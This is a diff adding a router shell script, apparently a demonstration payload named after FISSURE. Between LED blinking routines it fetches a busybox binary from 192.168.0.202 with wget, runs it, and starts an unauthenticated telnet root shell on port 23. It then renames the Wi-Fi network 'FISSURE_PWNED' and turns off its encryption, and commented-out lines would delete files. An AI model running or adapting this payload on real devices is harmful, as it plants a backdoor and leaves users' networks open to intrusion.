@@ -1,0 +1,107 @@
+#!/bin/sh
+
+C='/usr/bin/ledcli'
+
+all_on()
+{
+  $C STATUS_ON
+  $C WIFI2G_ON
+  $C WIFI5G_ON
+  $C WAN1_ON
+  $C LAN1_ON
+  $C LAN2_ON
+  $C LAN3_ON
+  $C LAN4_ON
+  $C USB1_ON
+  $C WPS_ON
+}
+
+all_off()
+{
+  $C STATUS_OFF
+  $C WIFI2G_OFF
+  $C WIFI5G_OFF
+  $C WAN1_OFF
+  $C LAN1_OFF
+  $C LAN2_OFF
+  $C LAN3_OFF
+  $C LAN4_OFF
+  $C USB1_OFF
+  $C WPS_OFF
+}
+
+
+run_lights()
+{
+  for i in 1 2 3
+  do
+    all_on
+    sleep 1
+    all_off 
+    sleep 1
+    all_on
+    sleep 1
+    all_off
+    sleep 1
+    $C STATUS_ON
+    sleep 1
+    $C STATUS_OFF
+    $C WIFI2G_ON
+    sleep 1
+    $C WIFI2G_OFF
+    $C WIFI5G_ON
+    sleep 1
+    $C WIFI5G_OFF
+    $C WAN1_ON
+    sleep 1
+    $C WAN1_OFF
+    $C LAN1_ON
+    sleep 1
+    $C LAN1_OFF
+    $C LAN2_ON
+    sleep 1
+    $C LAN2_OFF
+    $C LAN3_ON
+    sleep 1
+    $C LAN3_OFF
+    $C LAN4_ON
+    sleep 1
+    $C LAN4_OFF
+    $C USB1_ON
+    sleep 1
+    $C USB1_OFF
+    $C WPS_ON
+    sleep 1
+  done
+}
+
+#rm /B*
+#rm /Y*
+# $C WAN0_OFF
+all_on
+sleep 1
+
+wget http://192.168.0.202:55555/busybox-mips -P /tmp
+chmod +x /tmp/busybox-mips
+/tmp/busybox-mips telnetd 23 -l /bin/sh 
+
+sleep 3
+
+uci set wireless.@wifi-iface[0].ssid='FISSURE_PWNED'
+uci set wireless.@wifi-iface[0].encryption='none'
+uci commit wireless
+wifi
+
+sleep 1
+
+all_off
+
+sleep 1
+
+run_lights
+
+all_on
+
+sleep 1
+
+exit
